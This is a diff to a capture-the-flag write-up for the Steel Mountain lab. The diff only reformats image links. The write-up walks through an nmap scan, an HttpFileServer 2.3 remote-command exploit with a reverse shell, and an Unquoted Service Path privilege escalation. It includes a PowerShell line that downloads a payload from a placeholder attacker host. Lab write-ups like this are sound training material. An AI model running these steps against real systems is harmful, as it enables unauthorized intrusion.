@@ -33,19 +33,20 @@ For machine enumeration, we will scan all ports of the machine, request it to re
 -	-n: Disables DNS name resolution for IP addresses.
 
 ```sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.10.178.153 -oG allPorts```
-[1]:/assets/images/steelmountain/1.png
+
+![1]
 
 Upon port scanning, it was identified that a web server is being served on ports 80 and 8080. This indicates the presence of HTTP services on the target machine. Navigating to those ports, the following web pages were discovered.
 
-[2]:/assets/images/steelmountain/2.png
+![2]
 
 This web page is only useful to solve the first question of the lab. In this write-up, we will focus on compromising the machine.
 
-[3]:/assets/images/steelmountain/3.png
+![3]
 
 On the second page, we discovered an HttpFileServer 2.3. Using the "searchsploit" command to look for the name of this file, we found a Python script that allows remote command execution. This search was made possible by the ExploitDb database, which lists this exploit with the number 49584.
 
-[4]:/assets/images/steelmountain/4.png
+![4]
 
 The script first sets some variables, including the IP address and port of the attacker machine (lhost and lport), and the IP address and port of the victim machine (rhost and rport). It then defines a command to be executed on the victim machine in PowerShell, which sets up a TCP connection to the attacker machine and sends the output of any executed commands back to the attacker machine.
 
@@ -55,19 +56,18 @@ Finally ends by printing some debugging information and listening for incoming c
 
 To make this script work, we need to change the first 4 parameters.
 
-[5]:/assets/images/steelmountain/5.png
+![5]
 
 After running the script, we received the reverse shell on our machine.
 
-[6]:/assets/images/steelmountain/6.png
+![6]
 
-[7]:/assets/images/steelmountain/7.png
+![7]
 
 By obtaining a reverse shell on the target machine, we were able to retrieve the first flag.
 
-[8]:/assets/images/steelmountain/8.png
+![8]
 
----
 
 ## Privilege escalation
 
@@ -85,11 +85,11 @@ We need to launch an HTTP server using Python, specifying the directory where th
 
 ```sudo python3 -m http.server 8080```
 
-[9]:/assets/images/steelmountain/9.png
+![9]
 
 The vulnerability detected by the tool is called "Unquoted Service Path".
 
-[10]:/assets/images/steelmountain/10.png
+![10]
 
 The Unquoted Service Path vulnerability refers to an error in the way the path of a Windows service is specified in the registry. If the path contains spaces but is not enclosed in double quotes, the service may attempt to execute an unintended program or even a malicious backdoor. This vulnerability can be exploited if the user running the service has elevated privileges, allowing an attacker to escalate privileges to gain control over the system.
 
@@ -114,7 +114,7 @@ We will use the Invoke-WebRequest tool from the target machine to request the fi
 
 ```iwr -uri "http://AtackerIP:AtackerPort/Advanced.exe" -outfile "Advanced.exe```
 
-[11]:/assets/images/steelmountain/11.png
+![11]
 
 Finally, we just need to stop and restart the service. When the service runs again, it will execute our script before the legitimate one, and it will call a listener that we have set up on our attacker machine as an administrator.
 
@@ -126,6 +126,20 @@ Finally, we just need to stop and restart the service. When the service runs aga
 
 We receive the shell in the listener set up with netcat.
 
-[12]:/assets/images/steelmountain/12.png
+![12]
 
 In conclusion, this CTF provided an opportunity to practice different hacking techniques and tools, including enumeration, vulnerability scanning, exploitation, and privilege escalation. We were able to compromise the target machine by exploiting known vulnerabilities and using social engineering tactics. This CTF also helped us improve our understanding of how attackers can gain unauthorized access to systems and the importance of implementing security best practices to protect against such attacks.
+
+
+[1]:/assets/images/steelmountain/1.png
+[2]:/assets/images/steelmountain/2.png
+[3]:/assets/images/steelmountain/3.png
+[4]:/assets/images/steelmountain/4.png
+[5]:/assets/images/steelmountain/5.png
+[6]:/assets/images/steelmountain/6.png
+[7]:/assets/images/steelmountain/7.png
+[8]:/assets/images/steelmountain/8.png
+[9]:/assets/images/steelmountain/9.png
+[10]:/assets/images/steelmountain/10.png
+[11]:/assets/images/steelmountain/11.png
+[12]:/assets/images/steelmountain/12.png
